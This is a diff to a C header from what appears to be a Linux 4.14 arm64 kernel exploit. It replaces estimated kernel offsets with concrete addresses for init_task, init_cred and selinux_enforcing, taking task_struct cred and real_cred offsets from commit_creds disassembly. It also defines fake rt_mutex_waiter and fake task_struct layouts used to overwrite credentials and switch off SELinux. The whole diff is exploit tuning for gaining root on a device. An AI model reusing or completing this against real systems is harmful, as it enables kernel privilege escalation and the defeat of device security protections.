@@ -56,22 +56,17 @@
 #define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + 0x01010000ULL)
 
 /* ============================================================
- * init_task and init_cred - ESTIMATED offsets
+ * init_task and init_cred - Using aristotle-style offsets
  * ============================================================
+ * These are IMAGE addresses (what they would be at KIMAGE_TEXT_BASE)
+ * The canon_addr() function applies KASLR slide to get actual address
  */
-#define INIT_TASK_OFF 0x01000000ULL
-#define INIT_CRED_OFF 0x01016000ULL
-#define SELINUX_ENFORCING_OFF 0x01400000ULL
-#define PER_CPU_OFFSET_OFF 0x01200038ULL  /* Fixed: actual offset from kallsyms */
-#define ENTRY_TASK_OFF 0x01100000ULL
-#define ROOT_TASK_GROUP_OFF 0x01300000ULL
-
-#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
-#define INIT_CRED (KIMAGE_TEXT_BASE + INIT_CRED_OFF)
-#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
-#define PER_CPU_OFFSET (KIMAGE_TEXT_BASE + PER_CPU_OFFSET_OFF)
-#define ENTRY_TASK (KIMAGE_TEXT_BASE + ENTRY_TASK_OFF)
-#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
+#define INIT_TASK (KIMAGE_TEXT_BASE + 0x0277bf80ULL)
+#define INIT_CRED (KIMAGE_TEXT_BASE + 0x02790930ULL)
+#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + 0x02a25b90ULL)
+#define PER_CPU_OFFSET (KIMAGE_TEXT_BASE + 0x01200038ULL)
+#define ENTRY_TASK (KIMAGE_TEXT_BASE + 0x027362f8ULL)
+#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + 0x02976040ULL)
 
 /* ============================================================
  * rt_mutex_waiter layout for 4.14 (flat 10-word layout)
@@ -94,11 +89,14 @@
 #define FAKE_WAITER_LOCK_OFF 0x38
 
 /* ============================================================
- * task_struct offsets for 4.14 - ESTIMATED, need verification
+ * task_struct offsets for 4.14 - From disassembly analysis
  * ============================================================
+ * From commit_creds disassembly:
+ * ldr x9, [x8, #2008] = offset 0x7d8 = real_cred
+ * ldr x8, [x8, #2000] = offset 0x7d0 = cred
  */
-#define TASK_REAL_CRED_OFF 0x6a8
-#define TASK_CRED_OFF 0x6b0
+#define TASK_REAL_CRED_OFF 0x7d8
+#define TASK_CRED_OFF 0x7d0
 #define FAKE_TASK_USAGE_OFF 0x40
 #define FAKE_TASK_PRIO_OFF 0x84
 #define FAKE_TASK_NORMAL_PRIO_OFF 0x8c
